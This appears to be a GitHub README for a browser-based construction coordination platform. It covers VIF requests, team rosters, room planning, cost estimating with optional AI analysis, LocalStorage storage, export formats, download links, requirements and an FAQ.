# AEC CP v3.0 - AEC Field Coordination Platform 2026

> **AEC CP is a browser-based construction coordination platform for handling VIF requests, project data, team details, and cost-related workflows. Version 3.0 is now available.**

[![Platform](https://img.shields.io/badge/Platform-Web%20browser-blue?style=flat-square)](https://github.com)
[![Version](https://img.shields.io/badge/Version-v3.0-green?style=flat-square)](https://github.com)
[![Updated](https://img.shields.io/badge/Updated-2026-red?style=flat-square)](https://github.com)
[![License](https://img.shields.io/badge/License-GPL--3.0-yellow?style=flat-square)](LICENSE)
[![Stars](https://img.shields.io/github/stars/owenscottig8438/aec-cp-construction-hub?style=flat-square)](https://github.com/owenscottig8438/aec-cp-construction-hub)

---

<p align="center">
  <a href="https://owenscottig8438.github.io/aec-cp-construction-hub/">
    <img src="https://img.shields.io/badge/Download-AEC%20CP%20Latest-brightgreen?style=for-the-badge" alt="Download AEC CP">
  </a>
</p>

> **[Download AEC CP v3.0](https://owenscottig8438.github.io/aec-cp-construction-hub/)**

---

[Download Latest Build](https://owenscottig8438.github.io/aec-cp-construction-hub/)

---

## What AEC CP Provides

AEC CP gives architecture, engineering, and construction teams a shared browser workspace for everyday field coordination. It supports project creation, switching among active workspaces, archiving finished work, maintaining team records, and managing VIF requests throughout the coordination process.

In addition to coordination records, the platform includes room planning, estimating, unit conversion, and reporting capabilities. AI-assisted cost analysis is also available, while LocalStorage persistence and an offline-capable interface help users continue browser-based work during limited connectivity. Project information can be exported as XLSX, CSV, JSON, or TXT files.

---

## Core Capabilities

- Add, review, and monitor VIF requests
- Create projects, move between them, and archive completed work
- Build team rosters and upload member photos
- Apply AI assistance to project cost analysis
- Export records and reports as XLSX, CSV, JSON, or TXT
- Keep browser data available through LocalStorage
- Use the application with an offline-capable interface
- Plan rooms, estimate costs, convert units, and produce CSV reports
- Work in a dark frosted-glass visual environment
- Connect FastAPI, Claude AI, and Autodesk APS workflows when configured

---

## Getting Started

AEC CP runs in a modern web browser.

### Download and launch

1. Visit the [latest AEC CP build](https://owenscottig8438.github.io/aec-cp-construction-hub/).
2. Open the application using a supported browser.
3. Create a project or select an existing one to start managing coordination information.

### Use a local checkout

```bash
git clone https://github.com/owenscottig8438/aec-cp-construction-hub.git
cd REPO
```

After cloning, open the web entry point from the repository or start the included application service using the project's local development instructions. When the checkout is configured as a FastAPI application, run its documented development server command and open the local address it provides.

---

## Typical Workflow

AEC CP can be used for a coordination process such as the following:

1. Start the application and create a project.
2. Add participants to the roster, including profile photos where appropriate.
3. Enter VIF requests and maintain them as the work develops.
4. Define spaces with the room builder and associate related costs through the estimator.
5. Convert measurements using the unit conversion tools.
6. Run the AI cost analysis workflow when the required configuration is available.
7. Export project records or reports to XLSX, CSV, JSON, or TXT.
8. Archive projects that are no longer active.

When the network is unreliable, the browser can continue operating with the application retaining data through LocalStorage.

---

## Configuration and Data

Application data is stored on the client side with LocalStorage. As a result, project information and settings are tied to the browser profile and device where AEC CP is being used.

For local deployments that use AI, Autodesk APS, or FastAPI-backed functions, provide the relevant service connection settings through the environment or application configuration supplied with the project. Keep private credentials out of exported reports and committed source files.

---

## Requirements

- A current web browser with JavaScript and LocalStorage enabled
- A desktop or mobile device that can run a browser-based application
- Available browser storage for locally retained project information
- Network connectivity to download the application and access connected services
- Optional FastAPI configuration for local backend workflows
- Optional Claude AI and Autodesk APS setup for their respective integrations
- Enough additional storage for team photographs and exported reports

---

## Frequently Asked Questions

### What teams use AEC CP?

AEC CP is built for AEC teams coordinating construction work and managing project records, VIF requests, team information, room planning, and cost workflows.

### Can the application be used without an internet connection?

The interface is designed to support offline-capable use and can save information in LocalStorage. Functions that rely on external or connected services may still need network access.

### How is project information saved?

AEC CP stores browser-side application data in LocalStorage for the current browser profile. Export key records before changing browsers or devices.

### What is the update process?

Open the latest build link to use the current published release. If you are working from a local checkout, pull the newest repository changes and apply the project's setup instructions.

### Which export formats are supported?

Project information and reports can be exported as XLSX, CSV, JSON, and TXT. CSV-based reporting workflows are included as well.

### What can I do if project data appears to be missing?

Check that the same browser profile and device are in use, ensure browser storage was not deleted, and confirm that the intended project is selected. Keeping exported files also provides an additional copy of important records.

### Do AI and Autodesk integrations have to be enabled?

No. AI and Autodesk functionality are optional integration areas. Whether they are available depends on the configuration of the associated services.

---

## Roadmap

Possible future development includes:

- More extensive field coordination workflows
- Expanded report and export formats
- Additional controls for managing projects and teams
- Ongoing improvements to AI-assisted cost analysis
- More Autodesk APS and connected-service integrations
- Continued enhancement of offline browser operation

---

## License

GNU GPL v3.0 - see [LICENSE](LICENSE) for details.
